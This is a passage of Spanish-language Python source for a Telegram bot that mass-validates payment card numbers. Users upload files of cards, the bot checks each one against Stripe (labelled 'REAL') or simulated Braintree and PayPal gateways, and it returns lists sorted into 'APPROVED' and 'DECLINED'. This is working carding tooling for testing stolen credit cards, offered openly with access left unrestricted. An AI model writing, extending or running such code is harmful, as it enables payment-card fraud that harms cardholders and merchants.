        types.InlineKeyboardButton('❌ Cancelar', callback_data='cancel_file')
    )
    
    bot.reply_to(message, "📁 <b>received file</b>\n\nSelect gateway to start check:", reply_markup=markup, parse_mode="HTML")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"cards_{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {escape_html(str(e))}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
def process_file(call):
    data = call.data.split('_')
    gateway = data[1]  # stripe, bt, pp
    user_id = data[2]
    
    def process():
        filename = f"cards_{user_id}.txt"
        approved = 0
        declined = 0
        total = 0
        results = []
        
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                total = len(lines)
                
                bot.edit_message_text(
                    f"⏳ Processing {total} cards with{gateway.upper()}...\n\n0/{total}",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id
                )
                
                stopuser[user_id] = False
                
                for i, line in enumerate(lines):
                    if stopuser.get(user_id, False):
                        bot.edit_message_text(
                            f"⏹ Detenido\n✅ {approved}\n❌ {declined}\n📊 {i}/{total}",
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id
                        )
                        return
                    
                    cc = line.strip()
                    cc_validado = reg(cc)
                    
                    if not cc_validado:
                        declined += 1
                        results.append(f"❌ {cc} - Formato inválido")
                    else:
                        try:
                            if gateway == 'stripe':
                                result = check_card_stripe(cc_validado)
                            elif gateway == 'bt':
                                result = bran(cc_validado)
                            elif gateway == 'pp':
                                result = pali(cc_validado)
                            
                            if "✅" in result or "CHARGE" in result or "funds" in result:
                                approved += 1
                                results.append(f"✅ {cc_validado} - APPROVED")
                            else:
                                declined += 1
                                results.append(f"❌ {cc_validado} - DECLINED")
                        except:
                            declined += 1
                            results.append(f"❌ {cc_validado} - Error")
                    
                    if i % 3 == 0 or i == total-1:
                        markup = types.InlineKeyboardMarkup()
                        markup.add(types.InlineKeyboardButton('⏹ Detener', callback_data=f'stop_{user_id}'))
                        
                        bot.edit_message_text(
                            f"📊 Progreso: {i+1}/{total}\n✅ {approved}\n❌ {declined}",
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            reply_markup=markup
                        )
                    
                    time.sleep(2)  # Esperar 2 segundos entre verificaciones
                
                # Guardar resultados en un archivo
                result_filename = f"results_{user_id}.txt"
                with open(result_filename, 'w', encoding='utf-8') as f:
                    f.write(f"RESULTADOS DE VERIFICACIÓN - {gateway.upper()}\n")
                    f.write(f"Total: {total} | APPROVEDs: {approved} | Rechazadas: {declined}\n\n")
                    for r in results:
                        f.write(r + "\n")
                
                # Enviar archivo con resultados
                with open(result_filename, 'rb') as f:
                    bot.send_document(
                        call.message.chat.id,
                        f,
                        caption=f"✅ <b>Mass Check complete</b>\n\n📊 Total: {total}\n✅ APPROVED: {approved}\n❌ Declined: {declined}",
                        parse_mode="HTML"
                    )
                
                # Limpiar archivos
                try:
                    os.remove(filename)
                    os.remove(result_filename)
                except:
                    pass
                
        except Exception as e:
            bot.edit_message_text(
                f"❌ Error: {escape_html(str(e))}",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
    
    threading.Thread(target=process).start()

@bot.callback_query_handler(func=lambda call: call.data == 'cancel_file')
def cancel_file(call):
    bot.answer_callback_query(call.id, "Cancelado")
    bot.delete_message(call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def stop_file(call):
    user_id = call.data.split('_')[1]
    stopuser[user_id] = True
    bot.answer_callback_query(call.id, "⏹ Deteniendo...")

# ========== INICIAR BOT ==========

if __name__ == "__main__":
    print("="*60)
    print("🤖 BOT VERIFICADOR DE TARJETAS - MÚLTIPLES GATEWAYS")
    print("="*60)
    print(f"✅ Bot iniciado correctamente")
    print(f"👤 Admin ID: {admin}")
    print("🌐 Sin restricciones de acceso")
    print("="*60)
    print("📋 COMANDOS DISPONIBLES:")
    print("   • /sp - Stripe (REAL)")
    print("   • /cc - Braintree (simulation)")
    print("   • /pp - PayPal (simulation)")
    print("   • /bin - BIN info")
    print("   • /start - Main Menu")
    print("   • /help - Help")
    print("   • /myid - Check your ID")
    print("="*60)
    print("🔄 Esperando mensajes...")
    print("="*60)
    
    while True:
        try:
            bot.infinity_polling(none_stop=True, timeout=30)
        except Exception as e:
            print(f"❌ Error en el bot: {e}")
            time.sleep(5)
